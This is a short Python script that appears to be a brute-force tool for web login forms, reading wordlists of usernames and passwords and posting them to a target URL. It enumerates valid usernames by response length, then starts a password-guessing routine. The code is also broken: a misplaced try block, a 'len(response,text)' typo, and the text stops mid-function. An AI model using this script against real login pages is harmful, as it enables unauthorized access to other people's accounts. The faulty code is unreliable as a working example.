import requests

URL = input("Url target: ").strip()
USERNAME = input("Path file username.txt").strip()
PASSWORD = input("Path file password.txt").strip()

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded"
}

def check_username(username):
    data = {
        "username": username,
        "password": "password"
    }

try:
    response = requests.post(URL,headers=HEADERS, data=data)
    if len(response,text) > 2986:
        print(f"[v] USERNAME VALID: {username}")
        return True
    else:
        print(f"[x] USERNAME NOT VALID: {username}")
        return False
except Exception as e:
    print(f"[!] Field checked: {e}")
    return False

def try_check_password(username,password):
    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(URL, headers=HEADERS,data=data,allow_redirects=False)